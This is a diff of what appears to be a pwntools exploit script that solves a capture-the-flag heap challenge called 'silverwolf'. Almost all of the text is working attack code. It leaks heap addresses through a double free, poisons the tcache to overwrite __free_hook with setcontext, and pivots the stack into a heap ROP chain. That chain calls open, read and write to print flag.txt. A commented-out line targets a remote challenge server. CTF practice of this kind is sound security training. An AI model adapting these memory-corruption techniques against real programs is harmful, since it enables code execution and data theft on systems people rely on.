@@ -1,6 +1,7 @@
 from os import environ
 from pwn import *
 context(arch = "amd64", os = "Linux", log_level = "Debug")
+context.terminal = ['tmux','splitw','-h']
 io = process("./silverwolf")
 # io = remote("124.70.130.92", 60001)
 # gdb.attach(io)
@@ -100,48 +101,58 @@ pop_rsi = libc_addr + 0x23e6a
 pop_rdx = libc_addr + 0x1b96
 pop_rax = libc_addr + 0x439c8
 mov_rax_1 = libc_addr + 0xd0e30
+nop_ret = libc_addr + 0x1d58f0
 
-add(0x28)
+add(0x48)
 delete()
 delete()
 show()
 string_addr = u64(rl()[:6].ljust(8, '\0'))
 edit("./flag.txt")
 
+for i in range(8):
+    add(0x58)
+for i in range(8):
+    add(0x38)
+for i in range(11):
+    add(0x68)
+
 add(0x58)
+edit(p64(0)*11)
 delete()
 add(0x38)
-
+edit(p64(0)*7)
 #rop chain in heap
 add(0x78)
 delete()
 delete()
 show()
 context_addr = u64(rl()[:6].ljust(8, '\0'))
-context1  = p64(context_addr + 0x8)
+context1  = p64(context_addr + 0x8) + p64(nop_ret)
 context1 += p64(pop_rdi) + p64(string_addr) + p64(pop_rsi) + p64(0)
 context1 += p64(pop_rax) + p64(2) + p64(syscall_ret)
 context1 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(string_addr)
-context1 += p64(pop_rdx) + p64(0) + P64(pop_rdx)
+context1 += p64(nop_ret) + p64(pop_rdx)
 edit(context1)
-
+#pause()
 context2  = p64(pop_rdx) + p64(0x20) + p64(pop_rax) + p64(0)
 context2 += p64(syscall_ret) + p64(pop_rdi) + p64(1) + p64(pop_rsi)
 context2 += p64(string_addr) + p64(pop_rdx) + p64(0x20) + p64(mov_rax_1)
 context2 += p64(syscall_ret)
 add(0x68)
 edit(context2)
-
+#pause()
 #edit free hook
-add(0x48)
+add(0x68)
 delete()
 delete()
-edit(free_hook)
-add(0x48)
-add(0x48)
-edit(setcontext)
+edit(p64(free_hook))
+add(0x68)
+add(0x68)
+edit(p64(setcontext))
 
 #run free hook, hijack rsp to heap chunk to run rop chain
 add(0x58)
+log.info("context_addr : " + hex(context_addr))
 delete()
-io.recvall()
+print(rl())
